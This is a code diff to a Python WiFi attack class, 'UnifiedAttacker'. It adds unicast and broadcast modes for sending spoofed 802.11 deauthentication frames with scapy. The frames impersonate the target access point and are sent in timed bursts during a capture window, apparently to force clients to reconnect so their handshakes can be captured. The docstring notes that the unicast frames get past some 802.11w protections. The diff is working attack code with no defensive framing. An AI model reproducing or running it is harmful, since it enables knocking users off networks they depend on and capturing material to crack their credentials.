@@ -122,6 +122,8 @@ class UnifiedAttacker:
         output_dir: Path,
         log_cb: LogCallback,
         result_cb: ResultCallback,
+        unicast_deauth: bool = True,
+        client_count_cb: Optional[Callable[[int], None]] = None,
     ) -> None:
         self.target = target
         self.interface = interface
@@ -129,6 +131,8 @@ class UnifiedAttacker:
         self.output_dir = output_dir
         self._log = log_cb
         self._on_result = result_cb
+        self.unicast_deauth = unicast_deauth
+        self._client_count_cb = client_count_cb
         self._stop = threading.Event()
         self._current_proc: Optional[subprocess.Popen] = None
         self._monitor_iface: Optional[str] = None
@@ -738,45 +742,73 @@ class UnifiedAttacker:
             pass
 
         def _send_deauth() -> None:
-            """Send broadcast + unicast deauth bursts (spoofed as the AP).
+            """Send deauth frames spoofed as the AP.
 
-            Broadcast deauth is silently dropped by clients with 802.11w MFP
-            active.  Unicast deauth to specific client MACs bypasses some
-            PMF-capable (non-required) implementations.
+            Unicast mode: one frame per discovered client MAC — targeted,
+            less disruptive, better chance against 802.11w MFP-capable APs.
+            Broadcast mode: one frame to ff:ff:ff:ff:ff:ff — reaches all
+            clients at once but disconnects everyone on the AP.
             """
             try:
-                dot11_bc = sc.Dot11(
-                    type=0, subtype=12,
-                    addr1="ff:ff:ff:ff:ff:ff",
-                    addr2=self.target.bssid,
-                    addr3=self.target.bssid,
-                )
-                frame_bc = sc.RadioTap() / dot11_bc / sc.Dot11Deauth(reason=7)
-                sc.sendp(frame_bc, iface=iface_for_send, count=32, inter=0.05, verbose=False)
-
-                clients_snapshot = list(discovered_clients)
-                for client_mac in clients_snapshot:
-                    dot11_uc = sc.Dot11(
+                if self.unicast_deauth:
+                    clients_snapshot = list(discovered_clients)
+                    if not clients_snapshot:
+                        # No clients discovered yet — fall back to broadcast
+                        # for this round so we don't send nothing.
+                        dot11 = sc.Dot11(
+                            type=0, subtype=12,
+                            addr1="ff:ff:ff:ff:ff:ff",
+                            addr2=self.target.bssid,
+                            addr3=self.target.bssid,
+                        )
+                        sc.sendp(
+                            sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                            iface=iface_for_send, count=32, inter=0.05, verbose=False,
+                        )
+                        self._log("Deauth burst sent (broadcast — no clients seen yet)", "info")
+                    else:
+                        for client_mac in clients_snapshot:
+                            dot11 = sc.Dot11(
+                                type=0, subtype=12,
+                                addr1=client_mac,
+                                addr2=self.target.bssid,
+                                addr3=self.target.bssid,
+                            )
+                            sc.sendp(
+                                sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                                iface=iface_for_send, count=32, inter=0.05, verbose=False,
+                            )
+                        self._log(
+                            f"Deauth burst sent (unicast to {len(clients_snapshot)} client(s))", "info"
+                        )
+                else:
+                    dot11 = sc.Dot11(
                         type=0, subtype=12,
-                        addr1=client_mac,
+                        addr1="ff:ff:ff:ff:ff:ff",
                         addr2=self.target.bssid,
                         addr3=self.target.bssid,
                     )
-                    frame_uc = sc.RadioTap() / dot11_uc / sc.Dot11Deauth(reason=7)
-                    sc.sendp(frame_uc, iface=iface_for_send, count=16, inter=0.05, verbose=False)
-
-                client_info = f" + unicast to {len(clients_snapshot)} client(s)" if clients_snapshot else ""
-                self._log(f"Deauth burst sent (broadcast{client_info})", "info")
+                    sc.sendp(
+                        sc.RadioTap() / dot11 / sc.Dot11Deauth(reason=7),
+                        iface=iface_for_send, count=64, inter=0.05, verbose=False,
+                    )
+                    self._log("Deauth burst sent (broadcast)", "info")
             except Exception as exc:
                 self._log(f"Deauth failed (non-fatal): {exc}", "warn")
 
         # Send deauth at 5 s, 20 s, 35 s, 50 s into the 60 s capture window.
         _deauth_delays = [5, 15, 15, 15]   # seconds between rounds (total ≤ 50s)
         first_burst = True
+        _last_reported_count = -1
         for delay in _deauth_delays:
             time.sleep(delay)
             if self._stop.is_set() or not cap_thread.is_alive():
                 break
+            count = len(discovered_clients)
+            if count != _last_reported_count:
+                if self._client_count_cb:
+                    self._client_count_cb(count)
+                _last_reported_count = count
             if first_burst and discovered_clients:
                 self._log(
                     f"Clients seen: {', '.join(sorted(discovered_clients))} "
